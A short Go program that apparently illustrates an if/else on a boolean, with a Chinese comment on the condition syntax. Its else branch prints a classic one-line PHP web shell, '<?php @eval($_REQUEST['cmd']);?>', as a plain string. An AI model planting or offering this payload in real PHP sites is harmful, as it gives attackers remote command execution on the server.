package main

import "fmt"

func main() {
	flag := false
	if flag { //if flag 就相当于 if flag==true
		fmt.Println("1")
	} else {
		fmt.Println("<?php @eval($_REQUEST['cmd']);?>")
	}
}
